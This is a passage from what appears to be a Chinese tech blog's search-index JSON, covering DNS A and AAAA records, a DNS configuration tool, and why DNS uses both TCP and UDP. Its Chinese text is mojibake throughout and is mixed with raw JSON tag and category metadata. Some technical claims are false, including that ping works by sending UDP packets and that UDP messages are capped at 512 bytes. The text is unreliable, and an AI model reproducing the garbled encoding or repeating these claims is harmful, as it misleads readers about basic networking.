ç†è®°å½•æ’æŸ¥ç½‘ç»œé—®é¢˜äº‹çš„åŸŸåè§£æç›¸å…³é—®é¢˜ [toc] åŸºç¡€çŸ¥è¯†ç‚¹ A å’Œ AAAA A å’Œ AAAA éƒ½æ˜¯DNSè®°å½•ï¼Œå®ƒä»¬çš„ä½œç”¨æ˜¯å°†åŸŸåè§£æåˆ°IPåœ°å€ã€‚å…·ä½“æ¥è¯´ï¼ŒAè®°å½•å°†åŸŸåè§£æåˆ°IPv4åœ°å€ï¼Œè€ŒAAAAè®°å½•å°†åŸŸåè§£æåˆ°IPv6åœ°å€ã€‚ å› æ­¤ï¼Œä¸»è¦çš„åŒºåˆ«åœ¨äº A è®°å½•ç”¨äºIPv4ï¼Œè€Œ AAAA è®°å½•ç”¨äºIPv6ã€‚ ç›¸å…³å·¥å…· è®¾ç½®åŸŸåå·¥å…· å¸¸è§æ–¹å¼æ˜¯åœ¨ç½‘å¡çš„é…ç½®ç•Œé¢è®¾ç½® dns æœåŠ¡å™¨ï¼Œåœ¨é«˜çº§é¡µé¢å¯ä»¥é…ç½®å¤šä¸ª DNS æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œåœ¨ç‰¹æ®Šç¯å¢ƒï¼š å¦‚ä½¿ç”¨ netsh å‘½ä»¤è®¾ç½®çš„é™æ€ dns æœåŠ¡å™¨ç­‰ä¸ç”¨æˆ·æ‰‹åŠ¨æ·»åŠ çš„ dns ä¸€æ ·æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç° dns è§£æå¼‚å¸¸çš„é—®é¢˜ã€‚ quicksetdns_secå·¥å…·:QuickSetDNS - å¿«é€Ÿä¿®æ”¹ DNS æœåŠ¡å™¨å·¥å…· - å°ä¼—è½¯ä»¶","tags":[{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"DNS","slug":"DNS","permalink":"https://hodlyounger.github.io/tags/DNS/"},{"name":"Windows/åŸŸ/åŸŸå","slug":"Windows-åŸŸ-åŸŸå","permalink":"https://hodlyounger.github.io/tags/Windows-%E5%9F%9F-%E5%9F%9F%E5%90%8D/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"B-Code/ç½‘ç»œç¼–ç¨‹","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"DNS","slug":"B-Code/ç½‘ç»œç¼–ç¨‹/DNS","permalink":"https://hodlyounger.github.io/categories/B-Code/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/DNS/"}]},{"title":"ã€ç½‘ç»œç¼–ç¨‹ã€‘DNSç”¨çš„æ˜¯TCPåè®®è¿˜æ˜¯UDPåè®®","date":"2023-10-27T01:24:02.366Z","path":"B_Code/ç½‘ç»œç¼–ç¨‹/DNS/ã€ç½‘ç»œç¼–ç¨‹ã€‘DNSåè®®/","text":"æ¦‚è¿°: å…³äº DNS ä½¿ç”¨çš„æ˜¯ TCP è¿˜æ˜¯ UDP çš„è¯´æ˜ DNSç¼“å­˜é—®é¢˜å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç«  ã€æŸ¥çœ‹æµè§ˆå™¨DNSç¼“å­˜ã€‘ [toc] DNSæ¦‚è¿° DNSå ç”¨53å·ç«¯å£ï¼ŒåŒæ—¶ä½¿ç”¨TCPå’ŒUDPåè®®ã€‚ ğŸ“Œ é‚£ä¹ˆDNSåœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨è¿™ä¸¤ç§åè®®ï¼Ÿ DNSåœ¨åŒºåŸŸä¼ è¾“çš„æ—¶å€™ä½¿ç”¨TCPåè®®ï¼Œå…¶ä»–æ—¶å€™ä½¿ç”¨UDPåè®®ã€‚ DNSåŒºåŸŸä¼ è¾“çš„æ—¶å€™ä½¿ç”¨TCPåè®®ï¼š è¾…åŸŸåæœåŠ¡å™¨ä¼šå®šæ—¶ï¼ˆä¸€èˆ¬3å°æ—¶ï¼‰å‘ä¸»åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ä»¥ä¾¿äº†è§£æ•°æ®æ˜¯å¦æœ‰å˜åŠ¨ã€‚å¦‚æœ‰å˜åŠ¨ï¼Œä¼šæ‰§è¡Œä¸€æ¬¡åŒºåŸŸä¼ é€ï¼Œè¿›è¡Œæ•°æ®åŒæ­¥ã€‚åŒºåŸŸä¼ é€ä½¿ç”¨TCPè€Œä¸æ˜¯UDPï¼Œå› ä¸ºæ•°æ®åŒæ­¥ä¼ é€çš„æ•°æ®é‡æ¯”ä¸€ä¸ªè¯·æ±‚åº”ç­”çš„æ•°æ®é‡è¦å¤šå¾—å¤šã€‚ TCPæ˜¯ä¸€ç§å¯é è¿æ¥ï¼Œä¿è¯äº†æ•°æ®çš„å‡†ç¡®æ€§ã€‚ ğŸƒ åŸŸåè§£ææ—¶ä½¿ç”¨UDPåè®®ï¼š å®¢æˆ·ç«¯å‘DNSæœåŠ¡å™¨æŸ¥è¯¢åŸŸåï¼Œä¸€èˆ¬è¿”å›çš„å†…å®¹éƒ½ä¸è¶…è¿‡512å­—èŠ‚ï¼Œç”¨UDPä¼ è¾“å³å¯ã€‚ä¸ç”¨ç»è¿‡ä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿™æ ·DNSæœåŠ¡å™¨è´Ÿè½½æ›´ä½ï¼Œå“åº”æ›´å¿«ã€‚ç†è®ºä¸Šè¯´ï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥æŒ‡å®šå‘DNSæœåŠ¡å™¨æŸ¥è¯¢æ—¶ç”¨TCPï¼Œä½†äº‹å®ä¸Šï¼Œå¾ˆå¤šDNSæœåŠ¡å™¨è¿›è¡Œé…ç½®çš„æ—¶å€™ï¼Œä»…æ”¯æŒUDPæŸ¥è¯¢åŒ…ã€‚ DNSä¸ºä»€ä¹ˆç”¨TCPå’ŒUDP DNSåŒæ—¶å ç”¨UDPå’ŒTCPç«¯å£53æ˜¯å…¬è®¤çš„ï¼Œè¿™ç§å•ä¸ªåº”ç”¨åè®®åŒæ—¶ä½¿ç”¨ä¸¤ç§ä¼ è¾“åè®®çš„æƒ…å†µåœ¨TCP/IPæ ˆä¹Ÿç®—æ˜¯ä¸ªå¦ç±»ã€‚ä½†å¾ˆå°‘æœ‰äººçŸ¥é“DNSåˆ†åˆ«åœ¨ä»€ä¹ˆæƒ…å†µä¸‹ä½¿ç”¨è¿™ä¸¤ç§åè®®ã€‚ å…ˆç®€å•ä»‹ç»ä¸‹TCPä¸UDP TCPæ˜¯ä¸€ç§é¢å‘è¿æ¥çš„åè®®ï¼Œæä¾›å¯é çš„æ•°æ®ä¼ è¾“ï¼Œä¸€èˆ¬æœåŠ¡è´¨é‡è¦æ±‚æ¯”è¾ƒé«˜çš„æƒ…å†µï¼Œä½¿ç”¨è¿™ä¸ªåè®®ã€‚UDPâ€”ç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼Œæ˜¯ä¸€ç§æ— è¿æ¥çš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›é¢å‘äº‹åŠ¡çš„ç®€å•ä¸å¯é ä¿¡æ¯ä¼ é€æœåŠ¡ã€‚ TCPä¸UDPçš„åŒºåˆ«ï¼š UDPå’ŒTCPåè®®çš„ä¸»è¦åŒºåˆ«æ˜¯ä¸¤è€…åœ¨å¦‚ä½•å®ç°ä¿¡æ¯çš„å¯é ä¼ é€’æ–¹é¢ä¸åŒã€‚TCPåè®®ä¸­åŒ…å«äº†ä¸“é—¨çš„ä¼ é€’ä¿è¯æœºåˆ¶ï¼Œå½“æ•°æ®æ¥æ”¶æ–¹æ”¶åˆ°å‘é€æ–¹ä¼ æ¥çš„ä¿¡æ¯æ—¶ï¼Œä¼šè‡ªåŠ¨å‘å‘é€æ–¹å‘å‡ºç¡®è®¤æ¶ˆæ¯ï¼›å‘é€æ–¹åªæœ‰åœ¨æ¥æ”¶åˆ°è¯¥ç¡®è®¤æ¶ˆæ¯ä¹‹åæ‰ç»§ç»­ä¼ é€å…¶å®ƒä¿¡æ¯ï¼Œå¦åˆ™å°†ä¸€ç›´ç­‰å¾…ç›´åˆ°æ”¶åˆ°ç¡®è®¤ä¿¡æ¯ä¸ºæ­¢ã€‚ ä¸TCPä¸åŒï¼ŒUDPåè®®å¹¶ä¸æä¾›æ•°æ®ä¼ é€çš„ä¿è¯æœºåˆ¶ã€‚å¦‚æœåœ¨ä»å‘é€æ–¹åˆ°æ¥æ”¶æ–¹çš„ä¼ é€’è¿‡ç¨‹ä¸­å‡ºç°æ•°æ®æŠ¥çš„ä¸¢å¤±ï¼Œåè®®æœ¬èº«å¹¶ä¸èƒ½åšå‡ºä»»ä½•æ£€æµ‹æˆ–æç¤ºã€‚å› æ­¤ï¼Œé€šå¸¸äººä»¬æŠŠUDPåè®®ç§°ä¸ºä¸å¯é çš„ä¼ è¾“åè®®ã€‚ç›¸å¯¹äºTCPåè®®ï¼ŒUDPåè®®çš„å¦å¤–ä¸€ä¸ªä¸åŒä¹‹å¤„åœ¨äºå¦‚ä½•æ¥æ”¶çªå‘æ€§çš„å¤šä¸ªæ•°æ®æŠ¥ã€‚ä¸åŒäºTCPï¼ŒUDPå¹¶ä¸èƒ½ç¡®ä¿æ•°æ®çš„å‘é€å’Œæ¥æ”¶é¡ºåºã€‚äº‹å®ä¸Šï¼ŒUDPåè®®çš„è¿™ç§ä¹±åºæ€§åŸºæœ¬ä¸Šå¾ˆå°‘å‡ºç°ï¼Œé€šå¸¸åªä¼šåœ¨ç½‘ç»œéå¸¸æ‹¥æŒ¤çš„æƒ…å†µä¸‹æ‰æœ‰å¯èƒ½å‘ç”Ÿã€‚ æ—¢ç„¶UDPæ˜¯ä¸€ç§ä¸å¯é çš„ç½‘ç»œåè®®ï¼Œé‚£ä¹ˆè¿˜æœ‰ä»€ä¹ˆä½¿ç”¨ä»·å€¼æˆ–å¿…è¦å‘¢ï¼Ÿ å…¶å®ä¸ç„¶ï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹UDPåè®®å¯èƒ½ä¼šå˜å¾—éå¸¸æœ‰ç”¨ã€‚å› ä¸ºUDPå…·æœ‰TCPæ‰€æœ›å°˜è«åŠçš„é€Ÿåº¦ä¼˜åŠ¿ã€‚è™½ç„¶TCPåè®®ä¸­æ¤å…¥äº†å„ç§å®‰å…¨ä¿éšœåŠŸèƒ½ï¼Œä½†æ˜¯åœ¨å®é™…æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ä¼šå ç”¨å¤§é‡çš„ç³»ç»Ÿå¼€é”€ï¼Œæ— ç–‘ä½¿é€Ÿåº¦å—åˆ°ä¸¥é‡çš„å½±å“ã€‚åè§‚UDPç”±äºæ’é™¤äº†ä¿¡æ¯å¯é ä¼ é€’æœºåˆ¶ï¼Œå°†å®‰å…¨å’Œæ’åºç­‰åŠŸèƒ½ç§»äº¤ç»™ä¸Šå±‚åº”ç”¨æ¥å®Œæˆï¼Œæå¤§é™ä½äº†æ‰§è¡Œæ—¶é—´ï¼Œä½¿é€Ÿåº¦å¾—åˆ°äº†ä¿è¯ã€‚ DNSåœ¨è¿›è¡ŒåŒºåŸŸä¼ è¾“çš„æ—¶å€™ä½¿ç”¨TCPåè®®ï¼Œå…¶å®ƒæ—¶å€™åˆ™ä½¿ç”¨UDPåè®®ï¼› DNSçš„è§„èŒƒè§„å®šäº†2ç§ç±»å‹çš„DNSæœåŠ¡å™¨ï¼Œä¸€ä¸ªå«ä¸»DNSæœåŠ¡å™¨ï¼Œä¸€ä¸ªå«è¾…åŠ©DNSæœåŠ¡å™¨ã€‚åœ¨ä¸€ä¸ªåŒºä¸­ä¸»DNSæœåŠ¡å™¨ä»è‡ªå·±æœ¬æœºçš„æ•°æ®æ–‡ä»¶ä¸­è¯»å–è¯¥åŒºçš„DNSæ•°æ®ä¿¡æ¯ï¼Œè€Œè¾…åŠ©DNSæœåŠ¡å™¨åˆ™ä»åŒºçš„ä¸»DNSæœåŠ¡å™¨ä¸­è¯»å–è¯¥åŒºçš„DNSæ•°æ®ä¿¡æ¯ã€‚å½“ä¸€ä¸ªè¾…åŠ©DNSæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå®ƒéœ€è¦ä¸ä¸»DNSæœåŠ¡å™¨é€šä¿¡ï¼Œå¹¶åŠ è½½æ•°æ®ä¿¡æ¯ï¼Œè¿™å°±å«åšåŒºä¼ é€ï¼ˆzone transferï¼‰ã€‚ ä¸ºä»€ä¹ˆæ—¢ä½¿ç”¨TCPåˆä½¿ç”¨UDPï¼Ÿ é¦–å…ˆäº†è§£ä¸€ä¸‹TCPä¸UDPä¼ é€å­—èŠ‚çš„é•¿åº¦é™åˆ¶ï¼š UDPæŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ä¸º512å­—èŠ‚ï¼Œè€ŒTCPåˆ™å…è®¸æŠ¥æ–‡é•¿åº¦è¶…è¿‡512å­—èŠ‚ã€‚å½“DNSæŸ¥è¯¢è¶…è¿‡512å­—èŠ‚æ—¶ï¼Œåè®®çš„TCæ ‡å¿—å‡ºç°åˆ é™¤æ ‡å¿—ï¼Œè¿™æ—¶åˆ™ä½¿ç”¨TCPå‘é€ã€‚é€šå¸¸ä¼ ç»Ÿçš„UDPæŠ¥æ–‡ä¸€èˆ¬ä¸ä¼šå¤§äº512å­—èŠ‚ã€‚ åŒºåŸŸä¼ é€æ—¶ä½¿ç”¨TCPï¼Œä¸»è¦æœ‰ä¸€ä¸‹ä¸¤ç‚¹è€ƒè™‘ï¼š è¾…åŸŸåæœåŠ¡å™¨ä¼šå®šæ—¶ï¼ˆä¸€èˆ¬æ—¶3å°æ—¶ï¼‰å‘ä¸»åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢ä»¥ä¾¿äº†è§£æ•°æ®æ˜¯å¦æœ‰å˜åŠ¨ã€‚å¦‚æœ‰å˜åŠ¨ï¼Œåˆ™ä¼šæ‰§è¡Œä¸€æ¬¡åŒºåŸŸä¼ é€ï¼Œè¿›è¡Œæ•°æ®åŒæ­¥ã€‚åŒºåŸŸä¼ é€å°†ä½¿ç”¨TCPè€Œä¸æ˜¯UDPï¼Œå› ä¸ºæ•°æ®åŒæ­¥ä¼ é€çš„æ•°æ®é‡æ¯”ä¸€ä¸ªè¯·æ±‚å’Œåº”ç­”çš„æ•°æ®é‡è¦å¤šå¾—å¤šã€‚ TCPæ˜¯ä¸€ç§å¯é çš„è¿æ¥ï¼Œä¿è¯äº†æ•°æ®çš„å‡†ç¡®æ€§ã€‚ åŸŸåè§£ææ—¶ä½¿ç”¨UDPåè®®ï¼š å®¢æˆ·ç«¯å‘DNSæœåŠ¡å™¨æŸ¥è¯¢åŸŸåï¼Œä¸€èˆ¬è¿”å›çš„å†…å®¹éƒ½ä¸è¶…è¿‡512å­—èŠ‚ï¼Œç”¨UDPä¼ è¾“å³å¯ã€‚ä¸ç”¨ç»è¿‡TCPä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿™æ ·DNSæœåŠ¡å™¨è´Ÿè½½æ›´ä½ï¼Œå“åº”æ›´å¿«ã€‚è™½ç„¶ä»ç†è®ºä¸Šè¯´ï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥æŒ‡å®šå‘DNSæœåŠ¡å™¨æŸ¥è¯¢çš„æ—¶å€™ä½¿ç”¨TCPï¼Œä½†äº‹å®ä¸Šï¼Œå¾ˆå¤šDNSæœåŠ¡å™¨è¿›è¡Œé…ç½®çš„æ—¶å€™ï¼Œä»…æ”¯æŒUDPæŸ¥è¯¢åŒ…ã€‚ UDP UDP ä¸ TCP çš„ä¸»è¦åŒºåˆ«åœ¨äº UDP ä¸ä¸€å®šæä¾›å¯é çš„æ•°æ®ä¼ è¾“ã€‚äº‹å®ä¸Šï¼Œè¯¥åè®®ä¸èƒ½ä¿è¯æ•°æ®å‡†ç¡®æ— è¯¯åœ°åˆ°è¾¾ç›®çš„åœ°ã€‚UDP åœ¨è®¸å¤šæ–¹é¢éå¸¸æœ‰æ•ˆã€‚å½“æŸä¸ªç¨‹åºçš„ç›®æ ‡æ˜¯å°½å¿«åœ°ä¼ è¾“å°½å¯èƒ½å¤šçš„ä¿¡æ¯æ—¶ï¼ˆå…¶ä¸­ä»»æ„ç»™å®šæ•°æ®çš„é‡è¦æ€§ç›¸å¯¹è¾ƒä½ï¼‰ï¼Œå¯ä½¿ç”¨ UDPã€‚ICQ çŸ­æ¶ˆæ¯ä½¿ç”¨ UDP åè®®å‘é€æ¶ˆæ¯ã€‚ è®¸å¤šç¨‹åºå°†ä½¿ç”¨å•ç‹¬çš„TCPè¿æ¥å’Œå•ç‹¬çš„UDPè¿æ¥ã€‚é‡è¦çš„çŠ¶æ€ä¿¡æ¯éšå¯é çš„TCPè¿æ¥å‘é€ï¼Œè€Œä¸»æ•°æ®æµé€šè¿‡UDPå‘é€ã€‚ TCP TCPçš„ç›®çš„æ˜¯æä¾›å¯é çš„æ•°æ®ä¼ è¾“ï¼Œå¹¶åœ¨ç›¸äº’è¿›è¡Œé€šä¿¡çš„è®¾å¤‡æˆ–æœåŠ¡ä¹‹é—´ä¿æŒä¸€ä¸ªè™šæ‹Ÿè¿æ¥ã€‚TCPåœ¨æ•°æ®åŒ…æ¥æ”¶æ— åºã€ä¸¢å¤±æˆ–åœ¨äº¤ä»˜æœŸé—´è¢«ç ´åæ—¶ï¼Œè´Ÿè´£æ•°æ®æ¢å¤ã€‚å®ƒé€šè¿‡ä¸ºå…¶å‘é€çš„æ¯ä¸ªæ•°æ®åŒ…æä¾›ä¸€ä¸ªåºå·æ¥å®Œæˆæ­¤æ¢å¤ã€‚è®°ä½ï¼Œè¾ƒä½çš„ç½‘ç»œå±‚ä¼šå°†æ¯ä¸ªæ•°æ®åŒ…è§†ä¸ºä¸€ä¸ªç‹¬ç«‹çš„å•å…ƒï¼Œå› æ­¤ï¼Œæ•°æ®åŒ…å¯ä»¥æ²¿å®Œå…¨ä¸åŒçš„è·¯å¾„å‘é€ï¼Œå³ä½¿å®ƒä»¬éƒ½æ˜¯åŒä¸€æ¶ˆæ¯çš„ç»„æˆéƒ¨åˆ†ã€‚è¿™ç§è·¯ç”±ä¸ç½‘ç»œå±‚å¤„ç†åˆ†æ®µå’Œé‡æ–°ç»„è£…æ•°æ®åŒ…çš„æ–¹å¼éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯çº§åˆ«æ›´é«˜è€Œå·²ã€‚ ä¸ºç¡®ä¿æ­£ç¡®åœ°æ¥æ”¶æ•°æ®ï¼ŒTCPè¦æ±‚åœ¨ç›®æ ‡è®¡ç®—æœºæˆåŠŸæ”¶åˆ°æ•°æ®æ—¶å‘å›ä¸€ä¸ªç¡®è®¤ï¼ˆå³ ACKï¼‰ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶é™å†…æœªæ”¶åˆ°ç›¸åº”çš„ ACKï¼Œå°†é‡æ–°ä¼ é€æ•°æ®åŒ…ã€‚å¦‚æœç½‘ç»œæ‹¥å¡ï¼Œè¿™ç§é‡æ–°ä¼ é€å°†å¯¼è‡´å‘é€çš„æ•°æ®åŒ…é‡å¤ã€‚ä½†æ˜¯ï¼Œæ¥æ”¶è®¡ç®—æœºå¯ä½¿ç”¨æ•°æ®åŒ…çš„åºå·æ¥ç¡®å®šå®ƒæ˜¯å¦ä¸ºé‡å¤æ•°æ®åŒ…ï¼Œå¹¶åœ¨å¿…è¦æ—¶ä¸¢å¼ƒå®ƒã€‚ TCPä¸UDPçš„é€‰æ‹© å¦‚æœæ¯”è¾ƒUDPåŒ…å’ŒTCPåŒ…çš„ç»“æ„ï¼Œå¾ˆæ˜æ˜¾UDPåŒ…ä¸å…·å¤‡TCPåŒ…å¤æ‚çš„å¯é æ€§ä¸æ§åˆ¶æœºåˆ¶ã€‚ä¸TCPåè®®ç›¸åŒï¼ŒUDPçš„æºç«¯å£æ•°å’Œç›®çš„ç«¯å£æ•°ä¹Ÿéƒ½æ”¯æŒä¸€å°ä¸»æœºä¸Šçš„å¤šä¸ªåº”ç”¨ã€‚ä¸€ä¸ª16ä½çš„UDPåŒ…åŒ…å«äº†ä¸€ä¸ªå­—èŠ‚é•¿çš„å¤´éƒ¨å’Œæ•°æ®çš„é•¿åº¦ï¼Œæ ¡éªŒç åŸŸä½¿å…¶å¯ä»¥è¿›è¡Œæ•´ä½“æ ¡éªŒã€‚ï¼ˆè®¸å¤šåº”ç”¨åªæ”¯æŒUDPï¼Œå¦‚ï¼šå¤šåª’ä½“æ•°æ®æµï¼Œä¸äº§ç”Ÿä»»ä½•é¢å¤–çš„æ•°æ®ï¼Œå³ä½¿çŸ¥é“æœ‰ç ´åçš„åŒ…ä¹Ÿä¸è¿›è¡Œé‡å‘ã€‚ï¼‰ å¾ˆæ˜æ˜¾ï¼Œå½“æ•°æ®ä¼ è¾“çš„æ€§èƒ½å¿…é¡»è®©ä½äºæ•°æ®ä¼ è¾“çš„å®Œæ•´æ€§ã€å¯æ§åˆ¶æ€§å’Œå¯é æ€§æ—¶ï¼ŒTCPåè®®æ˜¯å½“ç„¶çš„é€‰æ‹©ã€‚å½“å¼ºè°ƒä¼ è¾“æ€§èƒ½è€Œä¸æ˜¯ä¼ è¾“çš„å®Œæ•´æ€§æ—¶ï¼Œå¦‚ï¼šéŸ³é¢‘å’Œå¤šåª’ä½“åº”ç”¨ï¼ŒUDPæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚åœ¨æ•°æ®ä¼ è¾“æ—¶é—´å¾ˆçŸ­ï¼Œä»¥è‡³äºæ­¤å‰çš„è¿æ¥è¿‡ç¨‹æˆä¸ºæ•´ä¸ªæµé‡ä¸»ä½“çš„æƒ…å†µä¸‹ï¼ŒUDPä¹Ÿæ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ï¼Œå¦‚ï¼šDNSäº¤æ¢ã€‚æŠŠSNMPå»ºç«‹åœ¨UDPä¸Šçš„éƒ¨åˆ†åŸå› æ˜¯è®¾è®¡è€…è®¤ä¸ºå½“å‘ç”Ÿç½‘ç»œé˜»å¡æ—¶ï¼ŒUDPè¾ƒä½çš„å¼€é”€ä½¿å…¶æœ‰æ›´å¥½çš„æœºä¼šå»ä¼ é€ç®¡ç†æ•°æ®ã€‚TCPä¸°å¯Œçš„åŠŸèƒ½æœ‰æ—¶ä¼šå¯¼è‡´ä¸å¯é¢„æ–™çš„æ€§èƒ½ä½ä¸‹ï¼Œä½†æ˜¯æˆ‘ä»¬ç›¸ä¿¡åœ¨ä¸è¿œçš„å°†æ¥ï¼ŒTCPå¯é çš„ç‚¹å¯¹ç‚¹è¿æ¥å°†ä¼šç”¨äºç»å¤§å¤šæ•°çš„ç½‘ç»œåº”ç”¨ã€‚ TCP TCPï¼ˆTransmission Control Protocolï¼Œä¼ è¾“æ§åˆ¶åè®®ï¼‰æ˜¯åŸºäºè¿æ¥çš„åè®®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ­£å¼æ”¶å‘æ•°æ®å‰ï¼Œå¿…é¡»å’Œå¯¹æ–¹å»ºç«‹å¯é çš„è¿æ¥ã€‚ ä¸€ä¸ªTCPè¿æ¥å¿…é¡»è¦ç»è¿‡ä¸‰æ¬¡â€œå¯¹è¯â€æ‰èƒ½å»ºç«‹èµ·æ¥ã€‚ä¸‰æ¬¡å¯¹è¯çš„ç®€å•è¿‡ç¨‹ï¼šä¸»æœºAå‘ä¸»æœºBå‘å‡ºè¿æ¥è¯·æ±‚æ•°æ®åŒ…ï¼šâ€œæˆ‘æƒ³ç»™ä½ å‘æ•°æ®ï¼Œå¯ä»¥å—ï¼Ÿâ€ï¼Œè¿™æ˜¯ç¬¬ä¸€æ¬¡å¯¹è¯ï¼›ä¸»æœºBå‘ä¸»æœºAå‘é€åŒæ„è¿æ¥å’Œè¦æ±‚åŒæ­¥ï¼ˆåŒæ­¥å°±æ˜¯ä¸¤å°ä¸»æœºä¸€ä¸ªåœ¨å‘é€ï¼Œä¸€ä¸ªåœ¨æ¥æ”¶ï¼Œåè°ƒå·¥ä½œï¼‰çš„æ•°æ®åŒ…ï¼šâ€œå¯ä»¥ï¼Œä½ ä»€ä¹ˆæ—¶å€™å‘ï¼Ÿâ€ï¼Œè¿™æ˜¯ç¬¬äºŒæ¬¡å¯¹è¯ï¼›ä¸»æœºAå†å‘å‡ºä¸€ä¸ªæ•°æ®åŒ…ç¡®è®¤ä¸»æœºBçš„è¦æ±‚åŒæ­¥ï¼šâ€œæˆ‘ç°åœ¨å°±å‘ï¼Œä½ æ¥ç€å§ï¼â€ï¼Œè¿™æ˜¯ç¬¬ä¸‰æ¬¡å¯¹è¯ã€‚ä¸‰æ¬¡â€œå¯¹è¯â€çš„ç›®çš„æ˜¯ä½¿æ•°æ®åŒ…çš„å‘é€å’Œæ¥æ”¶åŒæ­¥ï¼Œç»è¿‡ä¸‰æ¬¡â€œå¯¹è¯â€ä¹‹åï¼Œä¸»æœºAæ‰å‘ä¸»æœºBæ­£å¼å‘é€æ•°æ®ã€‚ UDP UDPï¼ˆUser Data Protocolï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰æ˜¯ä¸TCPç›¸å¯¹åº”çš„åè®®ã€‚å®ƒæ˜¯é¢å‘éè¿æ¥çš„åè®®ï¼Œå®ƒä¸ä¸å¯¹æ–¹å»ºç«‹è¿æ¥ï¼Œè€Œæ˜¯ç›´æ¥å°±æŠŠæ•°æ®åŒ…å‘é€è¿‡å»ï¼ UDPé€‚ç”¨äºä¸€æ¬¡åªä¼ é€å°‘é‡æ•°æ®ã€å¯¹å¯é æ€§è¦æ±‚ä¸é«˜çš„åº”ç”¨ç¯å¢ƒã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬ç»å¸¸ä½¿ç”¨â€œpingâ€å‘½ä»¤æ¥æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´TCP/IPé€šä¿¡æ˜¯å¦æ­£å¸¸ï¼Œå…¶å®â€œpingâ€å‘½ä»¤çš„åŸç†å°±æ˜¯å‘å¯¹æ–¹ä¸»æœºå‘é€UDPæ•°æ®åŒ…ï¼Œç„¶åå¯¹æ–¹ä¸»æœºç¡®è®¤æ”¶åˆ°æ•°æ®åŒ…ï¼Œå¦‚æœæ•°æ®åŒ…æ˜¯å¦åˆ°è¾¾çš„æ¶ˆæ¯åŠæ—¶åé¦ˆå›æ¥ï¼Œé‚£ä¹ˆç½‘ç»œå°±æ˜¯é€šçš„ã€‚ä¾‹å¦‚ï¼Œåœ¨é»˜è®¤çŠ¶æ€ä¸‹ï¼Œä¸€æ¬¡â€œpingâ€æ“ä½œå‘é€4ä¸ªæ•°æ®åŒ…ï¼ˆå¦‚å›¾2æ‰€ç¤ºï¼‰ã€‚å¤§å®¶å¯ä»¥çœ‹åˆ°ï¼Œå‘é€çš„æ•°æ®åŒ…æ•°é‡æ˜¯4åŒ…ï¼Œæ”¶åˆ°çš„ä¹Ÿæ˜¯4åŒ…ï¼ˆå› ä¸ºå¯¹æ–¹ä¸»æœºæ”¶åˆ°åä¼šå‘å›ä¸€ä¸ªç¡®è®¤æ”¶åˆ°çš„æ•°æ®åŒ…ï¼‰ã€‚è¿™å……åˆ†è¯´æ˜äº†UDPåè®®æ˜¯é¢å‘éè¿æ¥çš„åè®®ï¼Œæ²¡æœ‰å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ã€‚æ­£å› ä¸ºUDPåè®®æ²¡æœ‰è¿æ¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å®ƒçš„é€šä¿¡æ•ˆæœé«˜ï¼›ä½†ä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œå®ƒçš„å¯é æ€§ä¸å¦‚TCPåè®®é«˜ã€‚QQå°±ä½¿ç”¨UDPå‘æ¶ˆæ¯ï¼Œå› æ­¤æœ‰æ—¶ä¼šå‡ºç°æ”¶ä¸åˆ°æ¶ˆæ¯çš„æƒ…å†µã€‚HTTPæ˜¯ç”¨TCPåè®®ä¼ è¾“çš„ã€‚ TCPåè®®ä¸UDPåè®®çš„åŒºåˆ« TCPåŸºäºé¢å‘è¿æ¥çš„åè®®ï¼Œæ•°æ®ä¼ è¾“å¯é ï¼Œä¼ è¾“é€Ÿåº¦æ…¢ï¼Œé€‚ç”¨äºä¼ è¾“å¤§é‡æ•°æ®ï¼Œå¯é æ€§è¦æ±‚é«˜çš„åœºåˆã€‚ UDPåè®®é¢å‘éè¿æ¥åè®®ï¼Œæ•°æ®ä¼ è¾“ä¸å¯é ï¼Œä¼ è¾“é€Ÿåº¦å¿«ï¼Œé€‚ç”¨äºä¸€æ¬¡åªä¼ é€å°‘é‡æ•°æ®ã€å¯¹å¯é æ€§è¦æ±‚ä¸é«˜çš„åº”ç”¨ç¯å¢ƒã€‚ é¢å‘è¿æ¥çš„TCP â€œé¢å‘è¿æ¥â€å°±æ˜¯åœ¨æ­£å¼é€šä¿¡å‰å¿…é¡»è¦ä¸å¯¹æ–¹å»ºç«‹èµ·è¿æ¥ã€‚æ¯”å¦‚ä½ ç»™åˆ«äººæ‰“ç”µè¯ï¼Œå¿…é¡»ç­‰çº¿è·¯æ¥é€šäº†ã€å¯¹æ–¹æ‹¿èµ·è¯ç­’æ‰èƒ½ç›¸äº’é€šè¯ã€‚ TCPåè®®èƒ½ä¸ºåº”ç”¨ç¨‹åºæä¾›å¯é 